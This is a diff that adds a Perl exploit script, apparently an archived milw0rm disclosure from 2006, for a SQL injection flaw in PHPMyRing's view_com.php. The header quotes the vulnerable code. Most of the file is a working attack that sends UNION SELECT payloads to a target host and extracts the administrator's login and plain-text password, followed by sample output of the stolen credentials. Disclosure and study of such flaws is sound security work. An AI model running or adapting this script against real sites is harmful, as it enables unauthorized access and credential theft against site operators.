@@ -1,0 +1,159 @@
+# Title: PHPMyRing's (view_com.php) Remote SQL injection Exploit
+#
+# Vendor: phpmyring
+#
+# webiste : http://phpmyring.sourceforge.net/
+#
+# Version : <= 4.2.0
+#
+# Severity: Critical
+#
+# Discovered by: Simo64 <simo64_at_morx_org>
+# 
+# Exploit writting by: Simo Ben youssef <simo_at_morx_org>
+#
+# Discovered: 09 Aout 2006
+# 
+# Published : 10 Aout 2006
+# 
+# MorX Security Research Team
+# 
+# http://www.morx.org
+#
+# Details: 
+#
+# vulnerable code on view_com.php line ( 14 - 24)
+# 
+# [code]
+# -----------------------------------------------------------------------------------
+# if (!$idsite)
+#    {
+#    echo "<p align=\"center\">"._("Erreur! Le n&deg; du site n'est pas d&eacute;fini!")."</p>";
+#    }
+# else
+#     {
+#     // On va aller chercher le nom du site consern., .a sera fait ;)
+#     // Connexion MySQL
+#     $conn=connecte();
+#     $row=mysql_fetch_array(requete("SELECT site_nom FROM webring WHERE idsite=$idsite"));  # <== SQL injection
+#     $site_nom=$row['site_nom'];
+#     
+# ...............
+# 
+# <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+# <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<? echo _("fr"); ?>">
+# <head>
+# <title><? echo _("Commentaires du site"). " ".$site_nom; ?></title>    
+# ---------------------------------------------------------------------------------[/code]
+# 
+# $idsite is not properly sanitized and can be used to inject sql query
+# 
+# Exploit to extract both admin login and plain text password:
+#
+# C:\>perl ring.pl 127.0.0.1 webring
+# #################################################
+# #   PHPMyRing's Remote SQL injection Exploit    #
+# #   Discovered by simo64_at_morx_org            #
+# #   Script writting by simo_at_morx_org         #
+# #         MorX Security Research Team           #
+# #                 www.morx.org                  #
+# #################################################
+
+# [*] Trying to get the admin login ...
+
+# [+] your admin login is --> admin
+
+# [+] your admin pass is --> 123456
+ 
+use IO::Socket;
+
+if(!defined($ARGV[0] && $ARGV[1])) {
+
+system (clear);
+print "\n";
+print "#################################################\n";
+print "#   PHPMyRing's Remote SQL injection Exploit    #\n";
+print "#   Discovered by simo64_at_morx_org            #\n";
+print "#   Script writting by simo_at_morx_org         #\n";
+print "#         MorX Security Research Team           #\n";
+print "#                 www.morx.org                  #\n";
+print "#################################################\n\n";
+
+print "--- Usage:   perl $0 <host> <folder>\n";
+print "--- Example: perl $0 127.0.0.1 afd_webring\n\n";
+exit; }
+
+$TARGET            = $ARGV[0];
+
+$FOLDER            = $ARGV[1];
+
+$PORT              = "80";
+
+$SCRIPT            = "/view_com.php?idsite=";
+
+$SQLPASS           = "-1%20UNION%20SELECT%20passadm%20FROM%20webring_adm";
+
+$SQLADMIN          = "-1%20UNION%20SELECT%20loginadm%20FROM%20webring_adm";
+
+################################################################################
+
+$COMMAND1         = "GET /$FOLDER$SCRIPT$SQLADMIN HTTP/1.1";
+$COMMAND2         = "Host: $TARGET";
+$COMMAND3         = "Connection: Close";
+$COMMAND4         = "GET /$FOLDER$SCRIPT$SQLPASS HTTP/1.1";
+
+$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET",PeerPort=>"$PORT")
+|| die "Can't connect to $TARGET";
+
+print "#################################################\n";
+print "#   PHPMyRing's Remote SQL injection Exploit    #\n";
+print "#   Discovered by simo64_at_morx_org            #\n";
+print "#   Script writting by simo_at_morx_org         #\n";
+print "#         MorX Security Research Team           #\n";
+print "#                 www.morx.org                  #\n";
+print "#################################################\n\n";
+
+sleep 2;
+
+print "[*] Trying to get the admin login ...\n\n";
+
+print $remote "$COMMAND1\n$COMMAND2\n$COMMAND3\n\n";
+
+while ($result = <$remote> ) {
+
+if ($result =~ /site (.*?)</ ) {
+$adminlogin = $1;
+print "[+] your admin login is --> $adminlogin\n\n";
+$a = 1;
+}
+}
+
+if ($a == 0) 
+{ 
+print "[-] Failed, cant get the admin login\n\n";
+print "[*] Trying to get the admin password ...\n\n";
+}
+
+$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET",PeerPort=>"$PORT")
+|| die "Can't connect to $TARGET";
+
+print $remote "$COMMAND4\n$COMMAND2\n$COMMAND3\n\n";
+
+while ($result2 = <$remote> ) {
+
+if ($result2 =~ /site (.*?)</ ) {
+$adminpass = $1;
+print "[+] your admin pass is --> $adminpass\n\n";
+$b = 1;
+}
+}
+
+if ($b == 0)
+{ print "[-] Failed, cant get the admin password\n";
+}
+
+$remote->flush();
+close($remote);
+exit;
+
+# milw0rm.com [2006-08-09]
